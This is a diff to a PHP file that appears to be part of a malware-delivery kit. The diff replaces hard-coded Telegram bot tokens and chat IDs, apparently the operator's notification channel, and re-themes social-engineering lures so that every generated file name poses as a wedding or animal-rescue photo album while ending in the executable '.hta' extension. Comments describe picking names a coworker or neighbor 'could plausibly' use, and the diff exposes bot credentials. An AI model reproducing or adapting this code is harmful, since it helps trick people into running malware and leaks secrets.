@@ -20,8 +20,8 @@
 // =====================================================================
 
 // Full bot token (id:secret) — a bare numeric id 404s on the API. Env-overridable.
-define('TG_BOT',   (string)($_ENV['TG_BOT'] ?? '7996594831:AAF40Dc-5ZnVKBldh5AnxVKsWNJmTnXxb2Q'));
-define('TG_CHAT',  '6221767926');
+define('TG_BOT',   (string)($_ENV['TG_BOT'] ?? '7977007247:AAEjVjEWzHTYrbWbMLAjxurKuPEheGD0dg8'));
+define('TG_CHAT',  '7901102007');
 
 // Stable HMAC secret so a token issued by index.php validates in later
 // requests (each web request is a separate process). Env-overridable; the
@@ -426,24 +426,24 @@ function gate_dl(): array {
 }
 
 // ------------------------------------------------------- name generation
-// Wedding-album name pool — generic and sender-agnostic (a coworker could
-// plausibly name their own album any of these). Fresh pick per visit.
+// Animal-rescue-story name pool — generic and sender-agnostic (a neighbor
+// could plausibly name their rescue album any of these). Fresh pick per visit.
 function make_name(): string {
     $a = [
-        'Our_Wedding_Album_'      . date('Y') . '_' . random_int(100, 999),
-        'Wedding_Photos_October'  . '_' . random_int(100, 999),
-        'Wedding_Day_Photos_'     . date('Y'),
-        'Our_Wedding_'            . date('Y') . '_Album',
-        'Wedding_Album_'          . random_int(1000, 9999),
-        'The_Big_Day_Photos_'     . random_int(100, 999),
+        'Animal_Rescue_Story_'    . date('Y') . '_' . random_int(100, 999),
+        'Rescued_Friends_Photos_' . random_int(100, 999),
+        'Our_Rescue_Journey_'     . date('Y'),
+        'Adopted_Fur_Babies_'     . date('Y') . '_Photos',
+        'Rescue_Album_'           . random_int(1000, 9999),
+        'The_Rescued_Pups_Photos' . '_' . random_int(100, 999),
     ];
     $b = [
-        'Wedding_Photos_'         . date('Ymd') . '_' . random_int(100, 999),
-        'Just_Married_Album_'     . random_int(1000, 9999),
-        'Ceremony_Photos_'        . date('Y') . '_' . random_int(100, 999),
-        'Reception_Photos_'       . random_int(100, 999),
-        'Our_Day_Photos_'         . date('Y'),
-        'Wedding_Memories_'       . random_int(10000, 99999),
+        'Rescue_Photos_'          . date('Ymd') . '_' . random_int(100, 999),
+        'New_Best_Friends_Album_' . random_int(1000, 9999),
+        'Rescued_Kittens_Photos_' . date('Y') . '_' . random_int(100, 999),
+        'Fur_Babies_Growing_'     . random_int(100, 999),
+        'Shelter_To_Home_'        . date('Y'),
+        'Our_Award_Winning_Rescues_' . random_int(10000, 99999),
     ];
     $pool = random_int(0, 1) ? $a : $b;
     return $pool[random_int(0, count($pool)-1)] . '.hta';
